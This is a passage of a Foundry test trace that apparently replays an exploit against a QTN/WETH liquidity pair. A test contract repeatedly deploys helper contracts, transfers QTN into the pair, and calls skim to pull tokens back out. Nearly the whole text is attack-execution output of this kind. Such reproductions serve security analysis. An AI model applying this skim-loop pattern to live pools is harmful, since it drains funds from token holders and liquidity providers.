    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xD16d567549A2a2a2005aEACf7fB193851603dd70
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x13aa49bAc059d709dd0a18D6bb63290076a702D7
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x756e0562323ADcDA4430d6cb456d9151f605290B
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xe8dc788818033232EF9772CB2e6622F1Ec8bc840
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x796f2974e3C1af763252512dd6d521E9E984726C
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x796f2974e3C1af763252512dd6d521E9E984726C])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x92a6649Fdcc044DA968d94202465578a9371C7b1
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x886D6d1eB8D415b00052828CD6d5B321f072073d
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x3C4293F66941ECa00f4950C10d4255d5c271bAeF
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36])
